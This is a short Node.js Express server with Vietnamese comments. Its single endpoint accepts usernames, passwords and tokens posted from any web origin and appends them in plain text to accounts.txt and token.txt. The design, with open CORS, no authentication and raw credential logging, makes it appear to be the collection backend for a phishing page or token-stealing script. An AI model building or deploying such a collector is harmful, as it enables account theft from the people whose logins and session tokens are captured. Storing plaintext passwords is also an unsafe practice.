const express = require('express');
const cors = require('cors');
const fs = require('fs');
const app = express();

app.use(express.json());
app.use(cors());

// API nhận dữ liệu từ web gửi lên
app.post('/api/save-account', (req, res) => {
    const { username, password, token, timestamp } = req.body;

    if (!username || !password) {
        return res.status(400).json({ success: false, message: "Thiếu dữ liệu!" });
    }

    // Tạo nội dung lưu vào file
    const accountData = `Tài khoản: ${username} | Mật khẩu: ${password} | Thời gian: ${timestamp}\n`;
    const tokenData = `Username: ${username} | Token: ${token}\n`;

    // Lưu vào file accounts.txt và token.txt trên server
    fs.appendFileSync('accounts.txt', accountData);
    fs.appendFileSync('token.txt', tokenData);

    console.log(`Đã lưu tài khoản: ${username}`);
    res.json({ success: true, message: "Lưu thành công!" });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server đang chạy trên cổng ${PORT}`);
});